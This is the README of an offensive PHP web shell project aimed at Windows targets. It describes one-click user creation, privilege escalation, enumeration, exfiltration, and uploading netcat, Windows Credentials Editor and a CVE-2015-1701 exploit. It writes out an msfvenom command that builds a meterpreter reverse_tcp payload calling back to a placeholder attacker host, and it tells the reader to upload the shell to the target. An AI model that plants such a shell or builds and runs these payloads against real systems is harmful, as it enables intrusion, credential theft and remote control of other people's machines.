<h1> The Not-So Simple PHP Command Shell</h1>
<img src="/img/nsscmdshell.png" />
<p>Automates many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. Note that the tools in my quick upload function are not included in this repo as they are the work of other parties. Sources for quick upload files follow: <br>
PsTools: https://download.sysinternals.com/files/PSTools.zip <br>
CVE-2015-1701 Priv Esc(aka Taihou.exe) https://github.com/hfiref0x/CVE-2015-1701<br>
JAWs Enum: https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1<br>
Netcat for windows: https://github.com/int0x33/nc.exe<br>
Trend Micro Ransomware file Decryptor: <a href="https://powerbox-na-file.trend.org/SFDC/DownloadFile_iv.php?jsonInfo=%7B%22Query%22%3A%22dR%2BBrNMzg9JJ%2BWXagmE3CFGo6KHZSCtPVPWbg7058IWvcyqFByPzp7Z4BbItLT0NsFzkgJ0M94o3bXOPZnUaMn8BheublSy8lx4KW0qoVEoOa5y7oXGHz2cEAVug61PrxdNc4ubF%2F0%2Fo%2F28ETVpeohg%2F1LXEe9WTr%2B226RTY1Fy5cDIFi3jpKceg6BphKyMuDSbSXylWRKdYIpWKpjVQ8C57t%2BsE56nvuvo6MQmfekk4oRgyS03nH6MaTefGu4nx%22%2C%22iv%22%3A%2259e1f948abd6a90359e13f2b04fa37a5%22%7D" target="_blank"> here </a><br> 
Windows Credentials Editor: https://gitlab.com/kalilinux/packages/wce (wce32,64, and universal)<br>
DRW Ransomware Decryptor: https://download2.easeus.com/installer_rss_new.php<br>
venom.exe : (sudo) msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKBOXIP LPORT=ATTACBOXPORT -e x86/shikata_ga_nai -f exe -o venom.exe
</p>

<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif" />
<h2>Automates or simplifies many on target enumeration functions. Including:</h2>
<ul>
<li>Simple system commands</li>
<li>File upload/download options</li>
<li>One click preset user creation (on compatible targets with sufficient privileges)</li>
<li>One click Priv Esc for preset user (on compatible targets with sufficient privileges)</li>
<li>One click user info/ user permissions info</li>
<li>One click systeminfo</li>
<li>One Click processes list</li>
<li>And many more...</li>
</ul>

<h2>How to use it</h2>
<p>First, change the variables, "$attackip" and "$attackport" to the appropriate values for YOUR attack machine:</p>
<code>$attackip = "10.0.2.6";</code><br>
<code>$attackport = "8000";</code>

<p>Next, upload the nsscmdshell.php file to the target. Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload and execute tools such as netcat or msvenom payload for further access to the target.  Once you've gained sufficient access to a target to upload the nsscmdshell, no further instruction on using this tool should be needed.  Do not open issues because you don't know how to use this tool.  It works.  Got "Warning: file_get_contents(http://XX.XX.XX.XX:XXXX/filename.ext):failed to open stream: No connetion could be made...." error?  Two possible causes: 1).You didn't set the variables, "$attackip" and "$attackport" to your machine. Fix: ifconfig your ip, and set in nsscmdshell.php lines 10 and 11. 2). The files are not available on the defined server or port, or there is no server running on the defined port. Fix: python3 -m http.server XXXX in a directory containing the files you're attempting to upload.</p>
